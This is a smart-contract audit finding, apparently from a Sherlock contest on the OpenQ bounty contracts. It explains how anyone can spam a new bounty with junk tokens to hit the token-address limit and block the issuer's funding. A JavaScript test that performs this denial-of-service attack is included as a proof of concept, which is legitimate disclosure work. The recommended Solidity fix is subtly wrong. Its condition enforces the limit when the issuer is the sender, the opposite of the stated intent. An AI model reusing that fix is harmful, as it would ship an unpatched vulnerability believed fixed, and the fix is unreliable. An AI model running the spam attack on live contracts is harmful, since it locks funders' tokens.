# Issuer can be frontrun with spam tokens to brick bounties

## Summary
The bounties are designed to support a only limited number of non-whitelisted tokens per contract. Generally, protocol owners creating bounties pay a part of the bounty in a well established token (USDC etc) and the rest in the protocol's own token. Between the creation of the bounty by the owner and funding it with necessary tokens, a malicious user can spam arbitrary tokens to the contract and have it trigger the `tokenAddressLimitReached()` check and reject the actual funding from the deployer.
## Vulnerability Detail
The bounties are funded through the `DepositManagerV1.sol` contract's `fundBountyToken` function which is open to be called by anyone. There is a check in this function which limits how many non whitelisted tokens a bounty is allowed to handle, as shown in the snippet below
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/DepositManager/Implementations/DepositManagerV1.sol#L45-L50
and the function `tokenAddressLimitReached()` simply queries the bounty contract itself with `getTokenAddressesCount()`
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/DepositManager/Implementations/DepositManagerV1.sol#L207-L217
In the individual bounty contracts, we can see the function `getTokenAddressesCount` just calculates the length of an array,
https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/BountyCore.sol#L326-L328
This array is set in the `receiveFunds` function which processes deposits and can be called by anyone through `DepositManager`

The creation of the bounty contract and funding them are done in separate transactions, which leaves a time window for attackers to spam the bounty with deposits with random tokens to trigger the `tokenAddressLimitReached()` check. This will cause the actual deployer's funding transaction to revert.
## Impact
Bounty will be rendered useless. 
Suppose the owner wants to fund the contract with 500 USDC and 500 XAI tokens (some project's ERC20 token). USDC is likely to be in the whitelisted address so it will go through. However only after depositing 500 USDC will the owner realize that they cannot deposit the protocol tokens since the contract is full of junk tokens from the attacker. This can lead to forfeited/stuck tokens, and mismanaged funds.
## Code Snippet
The scenario can be recreated with the following test snippet. Here the attacker spams the contract until it this the `tokenAddressLimitReached` limit and the deployer's funding transaction is reverted.
```javascript
it('reverts when DOS attack with spam tokens', async () => {
          // ARRANGE
          const volume = 100
          await openQProxy.mintBounty(
            Constants.bountyId,
            Constants.organization,
            atomicBountyInitOperation
          )
          const bountyAddress = await openQProxy.bountyIdToAddress(
            Constants.bountyId
          )

          // Attacker funds with spam tokens upto tokenlimit
          const attacker = claimantThirdPlace
          const tokenLimit = (
            await openQTokenWhitelist.TOKEN_ADDRESS_LIMIT()
          ).toString()
          const MockBAD = await ethers.getContractFactory('MockDai')
          for (let i = 0; i < tokenLimit; i++) {
            const mockBAD = await MockBAD.connect(attacker).deploy()
            await mockBAD.deployed()
            await mockBAD.connect(attacker).approve(bountyAddress, 10000000)
            await depositManager
              .connect(attacker)
              .fundBountyToken(
                bountyAddress,
                mockBAD.address,
                volume,
                1,
                Constants.funderUuid
              )
          }

          // ACT
          // Owner tries to fund
          const mockNew = await MockBAD.deploy()
          await mockNew.deployed()
          await mockNew.approve(bountyAddress, 10000000)
          await expect(
            depositManager.fundBountyToken(
              bountyAddress,
              mockNew.address,
              volume,
              1,
              Constants.funderUuid
            )
          ).to.be.revertedWith('TOO_MANY_TOKEN_ADDRESSES')
        })
```

## Recommendation
Always allow issuers' funding to go through since issuer is a trusted party.
In the condition check in `DepositManager.sol`,
```solidity
if (!isWhitelisted(_tokenAddress) || msg.sender == bounty.issuer()) {
            require(
                !tokenAddressLimitReached(_bountyAddress),
                Errors.TOO_MANY_TOKEN_ADDRESSES
            );
        }
```
